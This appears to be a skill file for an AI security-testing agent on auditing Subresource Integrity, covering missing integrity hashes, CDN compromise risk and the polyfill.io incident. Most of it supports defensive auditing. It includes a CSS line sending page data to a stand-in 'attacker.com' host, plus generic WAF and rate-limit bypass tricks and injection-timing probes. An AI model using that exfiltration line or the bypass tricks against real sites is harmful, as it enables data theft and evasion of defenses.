---

name: web-41-sri-check
sequence: web-41
category: misc
domain: web
description: "Subresource Integrity (SRI) verification skill for supply chain security assessment. Covers missing SRI on external scripts and stylesheets, CDN compromise risk, dynamic script loading without integrity, and supply chain risk prioritization. Use when auditing third-party resource integrity."
wordlist_ref: "wordlists/web/web-63-sri-check/"
---

# Subresource Integrity (SRI) Check — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for missing Subresource Integrity (SRI) — cross-origin scripts and stylesheets loaded without integrity hash, exposing all users to supply chain attacks if the CDN is compromised or hijacked.

## OWASP Mapping
- A08:2021 Software and Data Integrity Failures
- CWE-353: Missing Support for Integrity Check
- CWE-494: Download of Code Without Integrity Check

## Vulnerability Classes

### 1. Missing SRI on External Script
**Detection:**
```html
<!-- Vulnerable: no integrity attribute -->
<script src="https://cdn.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Safe: SRI hash present -->
<script src="https://cdn.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
```

**Risk:** If CDN compromised → all sites loading that resource serve malicious JS to their users

### 2. CDN-Hosted Resources Without SRI
**High-priority CDNs to check:**
```
cdn.jsdelivr.net, unpkg.com, cdnjs.cloudflare.com
code.jquery.com, cdn.jsdelivr.net
stackpath.bootstrapcdn.com, maxcdn.bootstrapcdn.com
ajax.googleapis.com, fonts.googleapis.com
cdn.datatables.net, polyfill.io
```

**Polyfill.io compromise (2024):**
- polyfill.io CDN was compromised → served malicious code
- Any site loading from polyfill.io without SRI → served malware
- SRI would have caught the compromise

### 3. External Stylesheet Without SRI
**CSS can also execute JavaScript:**
```html
<link rel="stylesheet" href="https://cdn.example.com/style.css">
<!-- CSS expression{}: IE-era attacks, CSS-based data exfil via url() -->
```

**CSS injection risk via external stylesheet:**
- `background: url('https://attacker.com/?data=' attr(value))` → data exfil
- `expression()` CSS (IE) → JS execution

### 4. SRI Algorithm Weakness
**SRI algorithm options:**
- `sha256` → acceptable
- `sha384` → better
- `sha512` → best
- Older/weak algorithms: `md5`, `sha1` → NOT valid for SRI (browsers reject)

**Weak implementation:**
- Multiple integrity values provided: `integrity="sha256-abc sha384-def"` → browser chooses strongest

### 5. SRI on Same-Origin Resources
**Note:** SRI is only needed for cross-origin resources.
Same-origin scripts don't need SRI (covered by TLS + server integrity).
But: if CDN/S3 bucket is separate origin for same company's assets → still needs SRI.

### 6. Dynamic Script Loading Without SRI
**Runtime-loaded scripts:**
```javascript
// Vulnerable: no integrity check on dynamic load
const script = document.createElement('script');
script.src = 'https://cdn.example.com/analytics.js';
document.head.appendChild(script);
// No integrity attribute → no SRI protection
```

**Detection:** Analyze JavaScript for dynamic script/link element creation

### 7. Supply Chain Risk Prioritization
**Risk ranking by CDN type:**
- CRITICAL: Payment-related scripts (Stripe, PayPal, Braintree) without SRI
- HIGH: Authentication scripts (Clerk, Auth0, Firebase) without SRI
- HIGH: Analytics/tracking scripts with broad access
- MEDIUM: UI framework CDN (Bootstrap, jQuery)
- LOW: Font CDNs (fonts.googleapis.com)

---

# Parse all HTML pages for script/link tags
# Alert: "Sub Resource Integrity Attribute Missing"
## Attack Surface (Parameter Matrix)

| Surface | SRI Tests |
|---------|-----------|
| `<script src>` tags | All cross-origin script sources |
| `<link rel=stylesheet href>` | External stylesheet sources |
| Dynamic script loading | JS-created script elements |
| Module imports | ES6 import statements |
| Lazy-loaded resources | Webpack chunk loading |
| Third-party integrations | Payment, auth, analytics scripts |

---

## HackerOne Report Patterns

**Pattern 1: polyfill.io compromise (2024 — real incident)**
Thousands of sites loaded polyfill.io without SRI → malicious code served to users → demonstrated impact of missing SRI at scale.

**Pattern 2: Payment script without SRI (H1 multiple)**
Stripe.js loaded from `js.stripe.com` without SRI → if Stripe CDN compromised → attacker can steal all payment data from all integrations.

**Pattern 3: CDN typosquatting + missing SRI**
Developer accidentally uses `cdn.jqeury.com` (typo) → attacker registers domain → serves malicious JS → if SRI present, browser rejects non-matching hash.

**Pattern 4: Sourcemaps + missing SRI**
Source maps loaded from CDN → expose minified source → combined with missing SRI → supply chain attack via sourcemap CDN.

---

## Zero-Day Research Hooks

### Novel SRI Attack Vectors
- Import maps without SRI: `<script type="importmap">` can redirect module imports — no SRI support for import maps yet (browser spec limitation)
- Service Worker update: SW update code fetched remotely → no SRI → SW update poisoning
- WebRTC TURN server: JavaScript loaded for WebRTC integration → commonly lacks SRI
- Font-display CSS: Google Fonts CSS injection → loaded without SRI → CSS injection

---

## False Positive Mitigation
- Only flag cross-origin resources (same-origin doesn't need SRI)
- Distinguish high-risk (payment, auth) from low-risk (fonts, images) resources
- Don't flag resources that are dynamically generated (SRI can't hash dynamic content)
- Verify resource is actually loaded by page (not just referenced in HTML)

---




## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-63-sri-check/`

**Files**:
- `wordlists/web/web-63-sri-check/payloads/sri/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

